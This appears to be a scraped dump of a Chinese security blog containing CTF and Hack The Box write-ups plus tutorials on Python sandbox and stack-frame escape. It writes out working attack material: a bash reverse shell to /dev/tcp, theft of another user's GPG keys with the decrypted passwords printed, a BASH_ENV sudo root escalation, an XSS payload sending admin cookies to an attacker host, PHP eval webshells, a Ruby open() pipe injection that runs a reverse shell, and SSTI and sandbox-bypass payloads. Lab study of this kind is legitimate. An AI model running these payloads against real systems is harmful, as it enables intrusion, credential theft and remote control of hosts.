cmdbash+-c+%27bash+-i+%3E%26+devtcpip1234+0%3E%261%27 反弹shell成功后切换到 homehish目录 发现了.gnupg目录 此时www-data用户是没有权限对hish用户进行解密的，但是我们可以尝试复制hish用户的gpg私钥进行解密 .gnupg 是 GnuPG（GPG） 的配置与密钥目录，用于管理用户的加密密钥、配置文件、缓存等数据。 GPG 是 GNU 的 PGP 实现，主要用于：加密/解密文件签名文件/验证签名生成/导入/管理加密密钥 首先把这个文件备份到其他目录 cp -r /home/hish/.gnupg/* /tmp/mygpg/ 然后进入backup目录进行解密 gpg --homedir /tmp/mygpg --decrypt keyvault.gpg up$ gpg --homedir /tmp/mygpg --decrypt keyvault.gpggpg: WARNING: unsafe permissions on homedir /tmp/mygpggpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11 hish_ hish@environment.htbPAYPAL.COM - Ihaves0meMon$yhere123ENVIRONMENT.HTB - marineSPm@ster!!FACEBOOK.COM - summerSunnyB3ACH!! 然后按照hish用户登录 登陆过后 sudo -l得到 Matching Defaults entries for hish on environment: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=ENV BASH_ENV, use_ptyUser hish may run the following commands on environment: (ALL) /usr/bin/systeminfo env_keep+=ENV BASH_ENV 允许设置 BASH_ENV 环境变量，即允许通过该变量劫持 bash 启动时执行的脚本。 User hish may run the following commands: 可以使用 sudo 运行 /usr/bin/systeminfo（以 root 权限） 用 sudo 执行一个 bash 脚本（systeminfo），而 bash 会自动加载你用 BASH_ENV 注入的恶意脚本，从而实现以 root 权限执行任意命令！ 使用命令 echo exec /bin/bash /tmp/exploit.shsudo BASH_ENV=/tmp/exploit.sh /usr/bin/systeminfo//输入marineSPm@ster!! 即可成功登录 HTB-Cat还是nmap先扫描 正常开放22和80端口 配个host先 echo 10.10.11.53 cat.htb | sudo tee -a /etc/hosts 访问是个网站 有注册点 登陆进去找到一个可以文件上传的点 尝试了下发现没有可利用的点 因为是白名单 只能传图片 于是dirsearch继续信息收集 结果扫出来一堆.git的目录 user使用Githack获取源代码 然后开始审计吧 有很多个php文件 但是其实跟我现在做的网站有关的只有部分 剩下的比如admim.php accept_cat.php 等 我们暂时在网站中还没见到 但是你审计这些代码后就会发现 这个网站还有一个admin的存在并且使用session来验证是否为admin 当你上传你的猫儿资料过后 admin会来查看 它可以进行查看 接收 拒绝的操作(对应三个php代码) 所以我们很容易联想到xss的一类攻击手法 窃取管理员cookie伪造其登录 这里审计出大概存在xss 去这六个东西对应的php文件 最终锁定了注入点在登录框 注册帐号为img src=x onerror=document.location=http://10.10.14.58/?cookie=+document.cookie / 密码随便 进入上传猫咪资料的界面上传 同时开启监听 python3 -m http.server 80 成功拿到admin的cookie！ 修改cookie后成功进入admin页面 抓包 这里有sql注入漏洞 使用sqlmap进行注入 将reqeust保存为1.txt 然后使用sqlmap注入得到数据库 sqlmap -r request.txt -p catName --dbms sqlite --level 5 --risk 3 --tables --threads 10 --batchsqlmap -r request.txt -p catName --dbms sqlite --level 5 --risk 3 -T users --dump --threads 10 --batch 由源码知道使用axel登录 但是这个密码我没办法破解 尝试后rosa的密码可以知道 ac369922d560f17d6eeb8b2c7dec498c:soyunaprincesarosa 登录到这个用户 但是我们的核心目的还是登录axel 想办法拿到他的密码 发现rosa 还属于 adm 组（GID 4），通常用于系统日志访问权限。我们去看看日志吧 日志一般在varlog下 然后成功找到密码 使用ssh登录axel即可 然后在目录下找到user.txt成功读取 root登录axel的时有 说我有邮件 那就去看看什么邮件","tags":["渗透学习"]},{"title":"2025年夏季个人挑战赛PolarCTF-WEB","path":"/2025/06/29/2025年夏季个人挑战赛PolarCTF-WEB/","content":"ez_checkjava题暂时不会 狗黑子的变量考点:截取和拼接$PATH中的字符构造命令 构造方法: $PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin$PATJl/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 构造ls这个命令的结果 $PATH:5:1 //l$PATH:2:1 //s$PATH:5:1$PATH:2:1 //ls//第一个字母代表PATH里的第几个字符，从0开始，和数组一样 第二个是代表截取几个字符 dirsearch扫描 扫出admin.php 可以看到PATH的内容 于是乎就开始拼接要被替换的字母 $PATH:8;1at /* cat * 狗黑子的隐藏进去只有一个刷新按钮 dirsearch也没有看出东西 F12习惯 看到cmd参数 执行命令 成功 禁了 env看看 直接出假flag！！！！！！！！ ctrl+u得到源码 1\t?php 2\t// 检查是否有POST请求且包含cmd参数 3\tif ($_SERVER[REQUEST_METHOD] === POST isset($_POST[cmd])) 4 $cmd = $_POST[cmd]; 5 6 // 强制切换到当前目录（重要安全措施） 7 chdir(dirname(__FILE__)); 8 9 // 过滤危险字符和关键字10 $blacklist = array(f,g,cat, flag, , |, `,,,in,nd,de,ex,head,tac,le,ss,mo,re,..,/,\\\\);11 $is_dangerous = false;12 13 // 检查命令是否包含黑名单中的任何项14 foreach ($blacklist as $item) 15 if (stripos($cmd, $item) !== false) 16 $is_dangerous = true;17 break;18 19 20 21 // 如果检测到危险操作，回显错误信息22 if ($is_dangerous) 23 echo 不支持危险操作;24 else 25 // 检查过滤后的命令是否为空26 if (!empty($cmd)) 27 // 执行过滤后的命令28 system($cmd);29 30 31\t32\t? 直接写木马吧 cmd=echo ?php @eval($_POST[a]);? a.php antsword连接成功 执行命令即可 简单的链子好简单的菜鸟反序列化 ?phpclass A public $cmd = cat /flag; function __destruct() if (isset($this-cmd)) system($this-cmd); $a = new A();echo serialize($a);? 渗透之王首先进去是登录界面 帐号admin 随便猜了一个弱口令 提示密码错误 自己拿字典去爆也没爆出来 于是dirsearch扫了一下目录 得到有用的两个路径 访问admin.php得到base64加密的密文 解密后为polarctf www.zip源码泄露 下载下来发现需要密码 于是输入polarctf 成功解密 打开发现是个弱密码字典 于是我们就使用他的字典 爆出来密码是admin789 成功登录 进入界面点击发现提示非法的文件包含 那就是文件包含 /polarctf/?page=php://filter/convert.base64-encode/resource=about.php /polarctf/?page=php://filter/convert.base64-encode/resource=hint.php 提示有文件上传界面 现在就是找文件上传入口 这里你可以dirsearch扫 扫出来文件上传路径 很简单的文件上传 改一下content-type即可 antsword连接即可 真假ECR非预期: 进去就是源代码 禁了一些指令 但是你可以使用转义绕过 ?cmd=ca\\t /fla\\g 预期: 先访问flag.php 得到 KeY=aGVpZ291emk= USERID=p8Sjk58 DATA=2JSklNA= 如果这也不明白的话，加上后缀试一试 第一个解码后得到heigouzi 带上后缀php可以访问 参数应该也是cmd 执行命令ls 发现能够读取到这个网站的文件 cainiao.txtflag.phpheigouzi.phpindex.phpshe11.php 查看cainiao.txt 是个解密函数 用就好 数据:KeY=aGVpZ291emk= USERID=p8Sjk58 DATA=2JSklNA= ?phpclass Decryption public function decrypt($data, $key) $char = ; $str = ; $key = md5($key); $x = 0; $data = base64_decode($data); $len = strlen($data); $l = strlen($key); for ($i = 0; $i $len; $i++) if ($x == $l) $x = 0; $char.= substr($key, $x, 1); $x++; for ($i = 0; $i $len; $i++) $str.= chr(ord($data[$i]) - ord($char[$i])); return $str; $data = 2JSklNA=;$key = answer; $decryption = new Decryption();$result = $decryption-decrypt($data, $key);echo $result;? 解密出来是wanan 是she11.php的密码 antsword连接即可 nukaka_ser2没什么好说的 反序列化审链子 看起来很长 其实一下就做出了 pop链子如下 ?phpclass FlagReader private $logfile; protected $content;class DataValidator class FakeDanger private $buffer;class VulnerableClass public $logger; private $debugMode = true;$A = new VulnerableClass();$A - logger = new FlagReader();echo base64_encode(serialize($A));? ghost_render说是md渲染 抓包自己burp尝试 渲染我就想到ssti 测了下还真是 非常简单的ssti 没有过滤 直接执行命令即可 不过flag路径得首先去读取app.py才可以知道flag存储在varsecret_flag下 rce命令执行系统ls被过滤 试试转义 访问发f1ag.php得到 既然你找到这里了那就告诉你点东西吧 异或后它好像改名叫XOR_KEY，给他传个参试一试呢，对了，咱们的靶场叫什么来着？🤔 payload env XOR_KEYPolar easyRead嗯很简单的链子 但是拿flag很神经 flag我执行命令没找到 这道题flag是flag{HelloHellorun} exp ?phpClass Read public $source; public $is;class Help public $source; public $str;class Polar private $var = system(ls /);;class Doit public $is; private $source;$a = new Read(); $a1 = new Read();$a - source = $a1;$a1 - is = new Help();$a1 - is - str = new Doit();$a1 - is - str - is = new Polar();echo urlencode(serialize($a));? 命运石之门进去就是验证密码 ctrl+u发现提示 5pyJ5pe25YCZ77yM6aqM6K+B56CB5piv5ZCm5aW95L2/5LiN6YeN6KaB 然后dirsearch扫描发现 passwrod.txt 直接burp开爆 验证码说是不重要 随便填 结果还是要猜万能验证码0000 直接进第二步 还是爆密码 字典是拿到的password.txt内容 爆出来密码是 huan9le1Sam0 直接过人机验证即可得到flag 你也玩铲吗首先先注册 登陆进去看到ctrl+u看到提示 dirsearch扫描 扫描出来好几个敏感路径 访问login_admin.html 看到管理员登录界面 结合提示 伪造cookie 修改cookie如下图 再去访问admin_login.php","tags":["CTF-wp"]},{"title":"web刷题——持续更新","path":"/2025/06/09/BUU-刷题/","content":"[第五空间 2021]PNG图片转换器有源码，ruby写的，不是常见的语言首先联想cve，先看源码。 require sinatrarequire digestrequire base64get / do open(./view/index.html, r).read()endget /upload do open(./view/upload.html, r).read()endpost /upload do unless params[:file] params[:file][:tempfile] params[:file][:filename] params[:file][:filename].split(.)[-1] == png return scriptalert(error);location.href=/upload;/script end begin filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[:file][:filename]) + .png open(filename, wb) |f| f.write open(params[:file][:tempfile],r).read() Upload success, file stored at #filename rescue something wrong endendget /convert do open(./view/convert.html, r).read()endpost /convert do begin unless params[file] return scriptalert(error);location.href=/convert;/script end file = params[file] unless file.index(..) == nil file.index(/) == nil file =~ /^(.+)\\.png$/ return scriptalert(dont hack me);/script end res = open(file, r).read() headers Content-Type = text/html; charset=utf-8 var img = document.createElement(\\img\\); img.src= \\data:image/png;base64, + Base64.encode64(res).gsub(/\\s*/, ) + \\; rescue something wrong endend 做了两个功能点，upload和convert。审计下来限制的很死，唯一利用点就是open这比较可疑，考虑cve，ruby结合open果然有cve。 参考CVE-2017-17405 https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/middleware/Ruby-NetFTP-%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2017-17405.md 原理: Ruby-Net::FTP 模块是一个FTP客户端，上传文件过程中使用了open函数。open函数在ruby中是借用系统命令来打开文件，意味着如果没有做过滤，我们能利用这个点来执行命令。 payload: 如果+path+以一个管道字符（|）开头，就会创建一个子进程，通过一对管道连接到调用者。 返回的IO对象可用于向该子进程的标准输入写入和从标准输出读取。 file=|bash -c env #.pngfile=|`echo ZW52|base64 -d` e7e7eed2fbf6094265aebdf5344bfb8c.pngfile=|bash$IFS-c$IFSecho,YmFzaCAtaSA...|base64,-d|bash,-i [网鼎杯 2018]Fakebook进去没找到什么利用点，dirsearch扫描，有robots.txt 访问得到user.php.bak ?phpclass UserInfo public $name = ; public $age = 0; public $blog = ; public function __construct($name, $age, $blog) $this-name = $name; $this-age = (int)$age; $this-blog = $blog; function get($url) $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) return 404; curl_close($ch); return $output; public function getBlogContents () return $this-get($this-blog); public function isValidBlog () $blog = $this-blog; return preg_match(/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]2,6(\\:[0-9]+)?(\\/\\S*)?$/i, $blog); [网鼎杯 2020 朱雀组]phpweb进去就是一张贴脸大图 随便抓包看到参数 随便输发现 call_user_fun这个超明显的php函数 首先使用file_get_contents结合伪协议读取源码 (读源码不止一个方法 还有funhighlight_filepindex.php) ?php$disable_fun = array(exec,shell_exec,system,passthru,proc_open,show_source,phpinfo,popen,dl,eval,proc_terminate,touch,escapeshellcmd,escapeshellarg,assert,substr_replace,call_user_func_array,call_user_func,array_filter, array_walk, array_map,registregister_shutdown_function,register_tick_function,filter_var, filter_var_array, uasort, uksort, array_reduce,array_walk, array_walk_recursive,pcntl_exec,fopen,fwrite,file_put_contents); function gettime($func, $p) $result = call_user_func($func, $p); $a= gettype($result); if ($a == string) return $result; else return ; class Test var $p = Y-m-d h:i:s a; var $func = date; function __destruct() if ($this-func != ) echo gettime($this-func, $this-p); $func = $_REQUEST[func]; $p = $_REQUEST[p]; if ($func != null) $func = strtolower($func); if (!in_array($func,$disable_fun)) echo gettime($func, $p); else die(Hacker...); ? 这里有两个方法: 方法1：unserilize反序列化__destruc__魔术方法当类被销毁会自动触发 ?phpclass Test var $p = find / -name flag*; var $func = system;$a = new Test;echo serialize($a);? 看到可疑路径 tmpflagoefiu4r93 ?phpclass Test var $p = cat /tmp/flagoefiu4r93; var $func = system;$a = new Test;echo serialize($a);? 得道flag 方法2：命名空间方法原理在php中，函数加上\\号不会影响函数本身，因为in_array函数过滤不够严谨，所以我们可以利用加上\\号来绕过。 func\\systempfind -name fllag* 然后正常执行命令就行 [安洵杯 2019]easy_serialize_php?php$function = @$_GET[f];function filter($img) $filter_arr = array(php,flag,php5,php4,fl1g); $filter = /.implode(|,$filter_arr)./i; return preg_replace($filter,,$img);if($_SESSION) unset($_SESSION);$_SESSION[user] = guest;$_SESSION[function] = $function;extract($_POST);if(!$function) echo a href=index.php?f=highlight_filesource_code/a;if(!$_GET[img_path]) $_SESSION[img] = base64_encode(guest_img.png);else $_SESSION[img] = sha1(base64_encode($_GET[img_path]));$serialize_info = filter(serialize($_SESSION)); //得到序列化的数据if($function == highlight_file) highlight_file(index.php);else if($function == phpinfo) eval(phpinfo();); //maybe you can find something in here!else if($function == show_image) $userinfo = unserialize($serialize_info); //反序列化 echo file_get_contents(base64_decode($userinfo[img])); //取出序列化数据中的base64_encode过后的img先进行decode再进行读取文件内容//所以是$_SESSION序列化后被filter函数处理，再反序列化赋给userinfo，最后取出img这个键对应的值 代码理解理解代码在干什么很重要，审计代码的能力很重要。 这段php代码首先定义了一个名为filter函数，它会把传入的变量的值如果在它定义的数组里，就会把符合条件的字符串替换为空。 然后使用了变量覆盖里常用的函数extract来使我们$_SESSION[user]和$_SESSION[function]通过POST可控。 然后if判断是否传入img_path,没传入就是设置为guest_image.png,传入的话就会使用一个不可逆的sha1算法，所以我们肯定不考虑这个。 下一步是定义变量serialize_info为经过filter函数操作后的序列化后的数据。 再下来是if选择function功能 highlight_file是查看源码，phpinfo是查看phpinfo，show_image是做了一个反序列化操作，并且使用了一个敏感函数，file_get_contens。 题目做法：反序列化字符逃逸一共有两种方法：一个是键值逃逸，另一个是键名逃逸flag路径在phpinfo功能点就能看到 为d0g3_fllllllag 方法1：键值逃逸代码审计完了，有反序列化又有替换的操作，很容易联想到字符串逃逸。这里只有user和function可控。为了好理解我们先看序列化后的数据长什么样子。 ?php$_SESSION[user] = *;$_SESSION[function] = **;$_SESSION[img] = base64_encode(guest_img.png);echo serialize($_SESSION);?//a:3:s:4:user;s:2:aa;s:8:function;s:2:bb;s:3:img;s:20:Z3Vlc3RfaW1nLnBuZw==; 因为要让guest_img.png逃逸出去，所以我们应该修改user，让user经过字符串替换，function这个变量及其值成为user的值，img变量变为我们想要的值哦。 function应该为值为;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA”;} fileter处理前:a:3:{s:4:”user”;s:22:”phpphpphpflagphpphpphp”;s:8:”function”;s:56:”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA”;s:1:”a”;s:1:”a”;}”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw”;} ?php$_SESSION[user] = phpphpphpflagphpphpphp;$_SESSION[function] = ;s:3:img;s:20:L2QwZzNfZmxsbGxsbGFn;s:1:a;s:1:a;;$_SESSION[img] = base64_encode(guest_img.png);echo serialize($_SESSION);? filter处理后:a:3:{s:4:”user”;s:22:””;s:8:”function”;s:56:”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;s:1:”a”;s:1:”a”;}”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw”;} 于是function的值为img为L2QwZzNfZmxsbGxsbGFn,后面那一串就成功修改img值为flag的路径。 方法2：键名逃逸_SESSION[flagphp]=;s:1:1;s:3:img;s:20:L2QwZzNfZmxsbGxsbGFn; 过滤前 a:2:s:7:phpflag;s:48:;s:1:1;s:3:img;s:20:ZDBnM19mMWFnLnBocA==; 过滤后 a:2:s:7:;s:48:;s:1:1;s:3:img;s:20:ZDBnM19mMWFnLnBocA==; 下面的步骤和值替换一样 这里的键名变为;s:48: 实现了逃逸 payload:_SESSION[flagphp];s:1:”1”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;} [De1CTF 2019]SSRF Me进去贴脸源码,python代码审计。 #!/usr/bin/env python# encoding=utf-8from flask import Flask, requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(latin1)app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if not os.path.exists(self.sandbox): # SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = result[code] = 500 if self.checkSign(): if scan in self.action: tmpfile = open(./%s/result.txt % self.sandbox, w) resp = scan(self.param) if resp == Connection Timeout: result[data] = resp else: print (resp) tmpfile.write(resp) tmpfile.close() result[code] = 200 if read in self.action: f = open(./%s/result.txt % self.sandbox, r) result[code] = 200 result[data] = f.read() if result[code] == 500: result[data] = Action Error else: result[code] = 500 result[msg] = Sign Error return result def checkSign(self): return getSign(self.action, self.param) == self.sign# generate Sign For Action Scan.@app.route(/geneSign, methods=[GET, POST])def geneSign(): param = urllib.unquote(request.args.get(param, )) action = scan return getSign(action, param)@app.route(/De1ta, methods=[GET, POST])def challenge(): action = urllib.unquote(request.cookies.get(action)) param = urllib.unquote(request.args.get(param, )) sign = urllib.unquote(request.cookies.get(sign)) ip = request.remote_addr if waf(param): return No Hacker!!!! task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route(/)def index(): return open(code.txt, r).read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return Connection Timeoutdef getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check = param.strip().lower() if check.startswith(gopher) or check.startswith(file): return True return Falseif __name__ == __main__: app.debug = False app.run(host=0.0.0.0, port=80) 三个路由：/ 查看源代码/geneSign 生成签名/De1ta 关键路由 可以进行读取文件 解题思路(除了这个方法还可以使用hash拓展攻击) 密钥是不变的。而action定死为scan了 可变的只有中间的param 那么md5(密钥+flag.txtread+scan)等于md5(密钥+flag.txt+readscan) 这步的cookie请自己添加 [GYCTF2020]FlaskApp进去是base64解密和加密功能 看到flask先条件反射ssti 输入49得到编码 输入解码器得到回显 继续测试 e3tjb25maWd9fQ 得到回显 被HTML 实体转义 丢给ai恢复下就ok Config ENV: production, DEBUG: True, TESTING: False, PROPAGATE_EXCEPTIONS: None, PRESERVE_CONTEXT_ON_EXCEPTION: None, SECRET_KEY: s_e_c_r_e_t_k_e_y, PERMANENT_SESSION_LIFETIME: datetime.timedelta(days=31), USE_X_SENDFILE: False, SERVER_NAME: None, APPLICATION_ROOT: /, SESSION_COOKIE_NAME: session, SESSION_COOKIE_DOMAIN: False, SESSION_COOKIE_PATH: None, SESSION_COOKIE_HTTPONLY: True, SESSION_COOKIE_SECURE: False, SESSION_COOKIE_SAMESITE: None, SESSION_REFRESH_EACH_REQUEST: True, MAX_CONTENT_LENGTH: None, SEND_FILE_MAX_AGE_DEFAULT: datetime.timedelta(seconds=43200), TRAP_BAD_REQUEST_ERRORS: None, TRAP_HTTP_EXCEPTIONS: False, EXPLAIN_TEMPLATE_LOADING: False, PREFERRED_URL_SCHEME: http, JSON_AS_ASCII: True, JSON_SORT_KEYS: True, JSONIFY_PRETTYPRINT_REGULAR: False, JSONIFY_MIMETYPE: application/json, TEMPLATES_AUTO_RELOAD: None, MAX_COOKIE_SIZE: 4093, BOOTSTRAP_USE_MINIFIED: True, BOOTSTRAP_CDN_FORCE_SSL: False, BOOTSTRAP_QUERYSTRING_REVVING: True, BOOTSTRAP_SERVE_LOCAL: False, BOOTSTRAP_LOCAL_SUBDOMAIN: None 成功SSTI 正常打ssti就好 黑名单 [import,os,popen,eval,*,?] payload:((lipsum.__globals__.__builtins__['__i''mport__']('o''s'))['p''open'](\"\\x63\\x61\\x74\\x20\\x2f\\x2a\")).read() [0CTF 2016]piapiapia","tags":["CTF-wp"]},{"title":"python沙箱逃逸","path":"/2025/05/12/沙箱逃逸/","content":"前言Q1：什么是沙箱？沙箱是一种安全机制，在限制的环境中运行不受信任的代码。python中沙箱主要用于限制python，防止执行命令或者进行一些危险的行为。 Q2：什么是沙箱绕过？就是怎么绕过沙箱对我们的限制，拿到危险函数，最终来执行命令的过程。 目的对于python沙箱绕过，我们最终可能要实现的想法有如下: ·绕过限制 执行命令 ·写文件到指定位置 绕过方式import方式的绕过 import xxx from xxx import * __import__(xxx) 使用其他的方式来导入包名__import__(os).__dict__[system](whoami)#python2 and python3__import__(.decode.(base64)).getoutput(pwd)#python2import importlibx = importlib.import_module(pbzznaqf.encode(rot_13)) #commandsprint (x.getoutput(pwd))#python2 模块路径方式的绕过python中所有的包都是以.py文件形式存在的，使用所有的包都是由绝对路径，我们可以是使用路径来达到引入包的目的。 一般和系统相关的信息都在sys下，使用sys.path可以查看到各个包的路径。 import sysprint(sys.path)#sys下还有一个modules，返回一个字典，可以查看各个模块对应的系统路径。print(sys.modules[os])#python2 and python3 如果把sys、os、reload一系列模块禁止了，使用模块对应路径来导入模块 前提是必须知道绝对路径 一般是默认路径不会改变 execfile(/usr/lib/python.2.7/os.py)#python2 with open(/usr/lib/python3.6/os.py,r) as f: #路径通过上面的sys方法来找 exec(f.read())system(ls)#python2 and python3 timieitimport timeittimeit.timeit(__import__(os).system(dir),number=1)#p2 and p3 builtins函数 dir(__builtins__)[ArithmeticError, AssertionError, AttributeError, BaseException, BaseExceptionGroup, BlockingIOError, BrokenPipeError, BufferError, BytesWarning, ChildProcessError, ConnectionAbortedError, ConnectionError, ConnectionRefusedError, ConnectionResetError, DeprecationWarning, EOFError, Ellipsis, EncodingWarning, EnvironmentError, Exception, ExceptionGroup, False, FileExistsError, FileNotFoundError, FloatingPointError, FutureWarning, GeneratorExit, IOError, ImportError, ImportWarning, IndentationError, IndexError, InterruptedError, IsADirectoryError, KeyError, KeyboardInterrupt, LookupError, MemoryError, ModuleNotFoundError, NameError, None, NotADirectoryError, NotImplemented, NotImplementedError, OSError, OverflowError, PendingDeprecationWarning, PermissionError, ProcessLookupError, RecursionError, ReferenceError, ResourceWarning, RuntimeError, RuntimeWarning, StopAsyncIteration, StopIteration, SyntaxError, SyntaxWarning, SystemError, SystemExit, TabError, TimeoutError, True, TypeError, UnboundLocalError, UnicodeDecodeError, UnicodeEncodeError, UnicodeError, UnicodeTranslateError, UnicodeWarning, UserWarning, ValueError, Warning, WindowsError, ZeroDivisionError, __build_class__, __debug__, __doc__, __import__, __loader__, __name__, __package__, __spec__, abs, aiter, all, anext, any, ascii, bin, bool, breakpoint, bytearray, bytes, callable, chr, classmethod, compile, complex, copyright, credits, delattr, dict, dir, divmod, enumerate, eval, exec, exit, filter, float, format, frozenset, getattr, globals, hasattr, hash, help, hex, id, input, int, isinstance, issubclass, iter, len, license, list, locals, map, max, memoryview, min, next, object, oct, open, ord, pow, print, property, quit, range, repr, reversed, round, set, setattr, slice, sorted, staticmethod, str, sum, super, tuple, type, vars, zip] __builtins__.__dict__[X19pbXBvcnRfXw==.decode(base64)](b3M=.decode(base64)).system(whoami)#但是这个只能python2使用#==__builtins__.__dict__[__import__](os).system(whoami)#p2 and p3 exec and evaleval(__import__(os).system(dir))eval(__import__(os).system(cat flag)) platformimport platformprint (platform.popen(dir).read())#python2 dir 和 __dict__class A(): def __init__(self): self.a = aprint (dir(A))print (A.__dict__) import sysprint (dir(sys.modules[__name__])) func_codedef f(x,y,z): a = secret b = 2333print (f.func_code.co_argcount)print (f.func_code.co_consts)print (f.func_code.co_code)#p2def f(x,y,z): a = secret b = 2333print(f.__code__.co_argcount)print(f.__code__.co_consts)print(f.__code__.co_code)#p3 import disdef f(x,y,z): a = secret b = 2333print (dis.dis(f)) object类基础函数其实就是SSTI 这里不多写 花式处理字符串编码open(chr(102)+chr(108)+chr(97)+chr(103)).read() __builtins__.__dict__[__import__](os).system(whoami)#p2 and p __loader__,__import__,compile,eval,exec,chr,input,locals,globals and `,,","tags":["CTF学习"]},{"title":"栈帧逃逸","path":"/2025/05/11/初学栈帧逃逸/","content":"初学栈帧逃逸栈帧介绍在 Python 中，栈帧（Stack Frame） 是函数调用时在内存中分配的一个数据结构，用于存储函数的运行信息（如局部变量、参数、返回地址等）。它是 Python 解释器管理函数调用和执行流程的核心机制之一，尤其在递归、异常处理和调试时非常重要。 栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。 栈帧运作原理def foo(a, b): c = a + b bar(c)def bar(x): y = x * 2 print(y)foo(3, 4) 栈帧变化： 1.调用 foo(3, 4)：创建 foo 函数的栈帧，压入调用栈。foo 函数的局部变量表包含 a3, b4。 2.执行 c a + b：在 foo 的操作数栈上计算 a + b，将结果 7 存储在局部变量 c 中。 3.调用 bar(c)：创建 bar 函数的栈帧，压入调用栈。bar 函数的局部变量表包含 x7。 4.执行 y x * 2：在 bar 的操作数栈上计算 x * 2，将结果 14 存储在局部变量 y 中。 5.执行 print(y)：打印 y 的值 14。 6.bar 函数结束：从调用栈中弹出 bar 的栈帧，释放其内存。 7.foo 函数结束：从调用栈中弹出 foo 的栈帧，释放其内存。 栈帧属性方法介绍：f_locals: 一个字典，包含了函数或方法的局部变量。键是变量名。f_globals: 一个字典，包含了函数或方法所在模块的全局变量。f_code: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。f_lasti: 整数，表示最后执行的字节码指令的索引。f_back: 指向上一级调用栈帧的引用，用于构建调用栈。 生成器介绍生成器（Generator）是Python中一种特殊的迭代器，它可以在迭代过程中动态生成值，而不需要一次性将所有值存储在内存中。 其实生成器就是一种特殊的函数，一边运行一边生成值。 [普通函数] def get_list(): return [1, 2, 3]result = get_list() # 一次性返回整个列表 [1, 2, 3] [生成器] 这种特殊的函数每次只“产出”一个值（yield），运行完一个再接着运行下一个，而不是一下子把所有结果返回。优点不言而喻，节省内存空间。 生成器使用yield语句来产生值，每次调用生成器的next()方法时，生成器会执行直到遇到下一个yield语句为止，然后返回yield语句后面的值 def get_gen(): yield 1 yield 2 yield 3 gen = get_gen() # 不会立即执行，只是创建生成器对象print(next(gen)) # 输出 1print(next(gen)) # 输出 2print(next(gen)) # 输出 3 生成器属性gi_code: 生成器对应的code对象。gi_frame: 生成器对应的frame（栈帧）对象。gi_running: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。gi_yieldfrom：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。gi_frame.f_locals：一个字典，包含生成器当前帧的本地变量。 生成器表达式使用类似列表推导式的语法，但使用圆括号而不是方括号，可以用来创建生成器对象。生成器表达式会逐个生成值，而不是一次性生成整个序列，这样可以节省内存空间，特别是在处理大型数据集时非常有用（依然符合每次生成值后保留当前的状态，以便下次调用时可以继续生成值）。 gen = (x * x for x in range(5))print(list(gen)) # 输出 [0, 1, 4, 9, 16] 和栈帧的结合接下来我给你看一个脚本 你就知道为什么我要介绍生成器这个东西了 def my_generator(): yield 1 yield 2 yield 3gen = my_generator()# 获取生成器的当前帧信息frame = gen.gi_frame# 输出生成器的当前帧信息print(Local Variables:, frame.f_locals)print(Global Variables:, frame.f_globals)print(Code Object:, frame.f_code)print(Instruction Pointer:, frame.f_lasti) 这个脚本并不难以理解，首先是定义一个生成器，然后我们调用生成器并且使用gi_frame获取了当前生成器栈帧，然后我们又访问栈帧对象的几个属性： f_locals是查看栈帧的存储的局部变量名，f_globals是查看全局变量名，f_code是查看函数或方法的字节码指令、常量、变量名等信息，f_lasti是查看最后执行的字节码指令的索引。 也许这些话语又变得很抽象，但是运行出来的结果将会很清晰的展示获取到的生成器的帧信息： Local Variables: Global Variables: __name__: __main__, __doc__: None, __package__: None, __loader__: _frozen_importlib_external.SourceFileLoader object at 0x0000024A3485C260, __spec__: None, __annotations__: , __builtins__: module builtins (built-in), __file__: D:\\\\pycharm\\\\PythonProject\\\\12121212.py, __cached__: None, my_generator: function my_generator at 0x0000024A346EA2A0, gen: generator object my_generator at 0x0000024A64CB1380, frame: frame at 0x0000024A347E4E00, file D:\\\\pycharm\\\\PythonProject\\\\12121212.py, line 1, code my_generatorCode Object: code object my_generator at 0x0000024A349F1200, file D:\\pycharm\\PythonProject\\12121212.py, line 1Instruction Pointer: 0 利用栈帧逃逸沙箱栈帧（stack frame）是函数调用时用来存储局部变量、返回地址等的一段内存空间。如果你能“逃逸”出这个栈帧的控制范围，你就能访问修改不该访问的内存（比如沙箱外的数据或指令），这就叫栈帧逃逸 原理是：是通过生成器的栈帧对象通过f_back（返回前一帧）从而逃逸出去获取globals符号表，例如： frame0 (f 